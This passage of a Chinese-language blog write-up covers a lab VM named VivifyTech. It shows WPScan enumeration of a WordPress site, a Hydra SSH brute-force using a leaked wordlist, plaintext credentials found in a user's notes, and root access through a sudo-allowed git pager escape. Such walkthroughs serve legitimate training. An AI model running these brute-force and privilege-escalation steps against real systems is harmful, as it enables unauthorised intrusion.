+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">rapid7</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">dos</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">wordpress_xmlrpc_dos</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">rapid7</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">wordpress_xmlrpc_login</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">rapid7</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">db</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">wordpress_pingback_access</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">WordPress</span> <span class="n">readme</span> <span class="n">found</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">readme</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Direct</span> <span class="n">Access</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confidence</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Upload</span> <span class="n">directory</span> <span class="n">has</span> <span class="n">listing</span> <span class="n">enabled</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Direct</span> <span class="n">Access</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confidence</span><span class="p">:</span> <span class="mi">100</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">The</span> <span class="n">external</span> <span class="n">WP</span><span class="o">-</span><span class="n">Cron</span> <span class="n">seems</span> <span class="n">to</span> <span class="n">be</span> <span class="n">enabled</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">cron</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Direct</span> <span class="n">Access</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confidence</span><span class="p">:</span> <span class="mi">60</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">References</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">iplocation</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">defend</span><span class="o">-</span><span class="n">wordpress</span><span class="o">-</span><span class="n">from</span><span class="o">-</span><span class="n">ddos</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">wpscanteam</span><span class="o">/</span><span class="n">wpscan</span><span class="o">/</span><span class="n">issues</span><span class="o">/</span><span class="mi">1299</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">WordPress</span> <span class="n">version</span> <span class="mf">6.7</span><span class="o">.</span><span class="mi">2</span> <span class="n">identified</span> <span class="p">(</span><span class="n">Latest</span><span class="p">,</span> <span class="n">released</span> <span class="n">on</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">11</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Rss</span> <span class="n">Generator</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">feed</span><span class="o">/</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">generator</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="err">?</span><span class="n">v</span><span class="o">=</span><span class="mf">6.7</span><span class="o">.</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">generator</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">comments</span><span class="o">/</span><span class="n">feed</span><span class="o">/</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">generator</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="err">?</span><span class="n">v</span><span class="o">=</span><span class="mf">6.7</span><span class="o">.</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">generator</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">WordPress</span> <span class="n">theme</span> <span class="ow">in</span> <span class="n">use</span><span class="p">:</span> <span class="n">twentytwentyfour</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Location</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentytwentyfour</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Last</span> <span class="n">Updated</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">13</span><span class="n">T00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">00.000</span><span class="n">Z</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Readme</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentytwentyfour</span><span class="o">/</span><span class="n">readme</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">The</span> <span class="n">version</span> <span class="n">is</span> <span class="n">out</span> <span class="n">of</span> <span class="n">date</span><span class="p">,</span> <span class="n">the</span> <span class="n">latest</span> <span class="n">version</span> <span class="n">is</span> <span class="mf">1.3</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="ne">Directory</span> <span class="n">listing</span> <span class="n">is</span> <span class="n">enabled</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Style</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentytwentyfour</span><span class="o">/</span><span class="n">style</span><span class="o">.</span><span class="n">css</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Style</span> <span class="n">Name</span><span class="p">:</span> <span class="n">Twenty</span> <span class="n">Twenty</span><span class="o">-</span><span class="n">Four</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Style</span> <span class="n">URI</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentytwentyfour</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Description</span><span class="p">:</span> <span class="n">Twenty</span> <span class="n">Twenty</span><span class="o">-</span><span class="n">Four</span> <span class="n">is</span> <span class="n">designed</span> <span class="n">to</span> <span class="n">be</span> <span class="n">flexible</span><span class="p">,</span> <span class="n">versatile</span> <span class="ow">and</span> <span class="n">applicable</span> <span class="n">to</span> <span class="n">any</span> <span class="n">website</span><span class="o">.</span> <span class="n">Its</span> <span class="n">collecti</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Author</span><span class="p">:</span> <span class="n">the</span> <span class="n">WordPress</span> <span class="n">team</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Author</span> <span class="n">URI</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">wordpress</span><span class="o">.</span><span class="n">org</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Urls</span> <span class="n">In</span> <span class="n">Homepage</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Version</span><span class="p">:</span> <span class="mf">1.0</span> <span class="p">(</span><span class="mi">80</span><span class="o">%</span> <span class="n">confidence</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Style</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentytwentyfour</span><span class="o">/</span><span class="n">style</span><span class="o">.</span><span class="n">css</span><span class="p">,</span> <span class="n">Match</span><span class="p">:</span> <span class="s1">&#39;Version: 1.0&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Enumerating</span> <span class="n">Users</span> <span class="p">(</span><span class="n">via</span> <span class="n">Passive</span> <span class="ow">and</span> <span class="n">Aggressive</span> <span class="n">Methods</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Brute</span> <span class="n">Forcing</span> <span class="n">Author</span> <span class="n">IDs</span> <span class="o">-</span> <span class="n">Time</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span> <span class="o">&lt;==&gt;</span> <span class="p">(</span><span class="mi">10</span> <span class="o">/</span> <span class="mi">10</span><span class="p">)</span> <span class="mf">100.00</span><span class="o">%</span> <span class="n">Time</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">02</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">User</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">Identified</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">sancelisso</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Found</span> <span class="n">By</span><span class="p">:</span> <span class="n">Author</span> <span class="n">Posts</span> <span class="o">-</span> <span class="n">Author</span> <span class="n">Pattern</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Confirmed</span> <span class="n">By</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">Rss</span> <span class="n">Generator</span> <span class="p">(</span><span class="n">Passive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">Wp</span> <span class="n">Json</span> <span class="n">Api</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>   <span class="o">-</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">64.23</span><span class="o">/</span><span class="n">wordpress</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">json</span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="err">?</span><span class="n">per_page</span><span class="o">=</span><span class="mi">100</span><span class="o">&amp;</span><span class="n">page</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">Author</span> <span class="n">Id</span> <span class="n">Brute</span> <span class="n">Forcing</span> <span class="o">-</span> <span class="n">Author</span> <span class="n">Pattern</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span>  <span class="n">Login</span> <span class="n">Error</span> <span class="n">Messages</span> <span class="p">(</span><span class="n">Aggressive</span> <span class="n">Detection</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">WPScan</span> <span class="n">DB</span> <span class="n">API</span> <span class="n">OK</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Plan</span><span class="p">:</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Requests</span> <span class="n">Done</span> <span class="p">(</span><span class="n">during</span> <span class="n">the</span> <span class="n">scan</span><span class="p">):</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="n">Requests</span> <span class="n">Remaining</span><span class="p">:</span> <span class="mi">21</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Finished</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">17</span> <span class="mi">13</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">08</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Requests</span> <span class="n">Done</span><span class="p">:</span> <span class="mi">57</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Cached</span> <span class="n">Requests</span><span class="p">:</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Sent</span><span class="p">:</span> <span class="mf">16.279</span> <span class="n">KB</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Received</span><span class="p">:</span> <span class="mf">358.677</span> <span class="n">KB</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Memory</span> <span class="n">used</span><span class="p">:</span> <span class="mf">168.461</span> <span class="n">MB</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Elapsed</span> <span class="n">time</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">09</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>好像并木有什么好用的，只有一个用户sancelisso
+ffuf探测一下，找到http://192.168.64.23/wordpress/wp-includes/secrets.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ curl &#34;http://192.168.64.23/wordpress/wp-includes/secrets.txt&#34;
+</span></span><span class="line"><span class="cl">agonglo
+</span></span><span class="line"><span class="cl">tegbesou
+</span></span><span class="line"><span class="cl">paparazzi
+</span></span><span class="line"><span class="cl">womenintech
+</span></span><span class="line"><span class="cl">Password123
+</span></span><span class="line"><span class="cl">bohicon
+</span></span><span class="line"><span class="cl">agodjie
+</span></span><span class="line"><span class="cl">tegbessou
+</span></span><span class="line"><span class="cl">Oba
+</span></span><span class="line"><span class="cl">IfÃ¨
+</span></span><span class="line"><span class="cl">Abomey
+</span></span><span class="line"><span class="cl">Gelede
+</span></span><span class="line"><span class="cl">BeninCity
+</span></span><span class="line"><span class="cl">Oranmiyan
+</span></span><span class="line"><span class="cl">Zomadonu
+</span></span><span class="line"><span class="cl">Ewuare
+</span></span><span class="line"><span class="cl">Brass
+</span></span><span class="line"><span class="cl">Ahosu
+</span></span><span class="line"><span class="cl">Igodomigodo
+</span></span><span class="line"><span class="cl">Edaiken
+</span></span><span class="line"><span class="cl">Olokun
+</span></span><span class="line"><span class="cl">Iyoba
+</span></span><span class="line"><span class="cl">Agasu
+</span></span><span class="line"><span class="cl">Uzama
+</span></span><span class="line"><span class="cl">IhaOminigbon
+</span></span><span class="line"><span class="cl">Agbado
+</span></span><span class="line"><span class="cl">OlokunFestival
+</span></span><span class="line"><span class="cl">Ovoranmwen
+</span></span><span class="line"><span class="cl">Eghaevbo
+</span></span><span class="line"><span class="cl">EwuareII
+</span></span><span class="line"><span class="cl">Egharevba
+</span></span><span class="line"><span class="cl">IgueFestival
+</span></span><span class="line"><span class="cl">Isienmwenro
+</span></span><span class="line"><span class="cl">Ugie-Olokun
+</span></span><span class="line"><span class="cl">Olokunworship
+</span></span><span class="line"><span class="cl">Ukhurhe
+</span></span><span class="line"><span class="cl">OsunRiver
+</span></span><span class="line"><span class="cl">Uwangue
+</span></span><span class="line"><span class="cl">miammiam45
+</span></span><span class="line"><span class="cl">Ewaise
+</span></span><span class="line"><span class="cl">Iyekowa
+</span></span><span class="line"><span class="cl">Idia
+</span></span><span class="line"><span class="cl">Olokunmask
+</span></span><span class="line"><span class="cl">Emotan
+</span></span><span class="line"><span class="cl">OviaRiver
+</span></span><span class="line"><span class="cl">Olokunceremony
+</span></span><span class="line"><span class="cl">Akenzua
+</span></span><span class="line"><span class="cl">Edoculture
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>http://192.168.64.23/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/ 是wp里面发布的文章
+搞到用户名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sarah
+</span></span><span class="line"><span class="cl">mark
+</span></span><span class="line"><span class="cl">emily
+</span></span><span class="line"><span class="cl">jake
+</span></span><span class="line"><span class="cl">alex
+</span></span><span class="line"><span class="cl">sancelisso
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破ssh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Desktop]
+</span></span><span class="line"><span class="cl">└─$ hydra -L usr.txt -P pass.txt 192.168.64.23 ssh
+</span></span><span class="line"><span class="cl">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 13:23:35
+</span></span><span class="line"><span class="cl">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+</span></span><span class="line"><span class="cl">[DATA] max 16 tasks per 1 server, overall 16 tasks, 294 login tries (l:6/p:49), ~19 tries per task
+</span></span><span class="line"><span class="cl">[DATA] attacking ssh://192.168.64.23:22/
+</span></span><span class="line"><span class="cl">[22][ssh] host: 192.168.64.23   login: sarah   password: bohicon
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功ssh上去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sarah@VivifyTech:~$ ls -a
+</span></span><span class="line"><span class="cl">.   .bash_history  .bashrc   .local    .profile
+</span></span><span class="line"><span class="cl">..  .bash_logout   .history  .private  user.txt
+</span></span><span class="line"><span class="cl">sarah@VivifyTech:~$ cat .private
+</span></span><span class="line"><span class="cl">cat: .private: Is a directory
+</span></span><span class="line"><span class="cl">sarah@VivifyTech:~$ cd .private/
+</span></span><span class="line"><span class="cl">sarah@VivifyTech:~/.private$ ls
+</span></span><span class="line"><span class="cl">Tasks.txt
+</span></span><span class="line"><span class="cl">sarah@VivifyTech:~/.private$ cat Tasks.txt 
+</span></span><span class="line"><span class="cl">- Change the Design and architecture of the website
+</span></span><span class="line"><span class="cl">- Plan for an audit, it seems like our website is vulnerable
+</span></span><span class="line"><span class="cl">- Remind the team we need to schedule a party before going to holidays
+</span></span><span class="line"><span class="cl">- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这玩意好像是个备忘录，绷不住了,用这个账号ssh上去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gbodja@VivifyTech:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for gbodja on VivifyTech:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+</span></span><span class="line"><span class="cl">    !admin_flag, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User gbodja may run the following commands on VivifyTech:
+</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/bin/git
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接写入!/bin/bash提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gbodja@VivifyTech:~$ sudo -u root /usr/bin/git help config
+</span></span><span class="line"><span class="cl">/bin/bash: line 1: bin/bash: Permission denied
+</span></span><span class="line"><span class="cl">!done  (press RETURN)
+</span></span><span class="line"><span class="cl">root@VivifyTech:/home/gbodja# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-02-18</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/vuln_hmv5/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
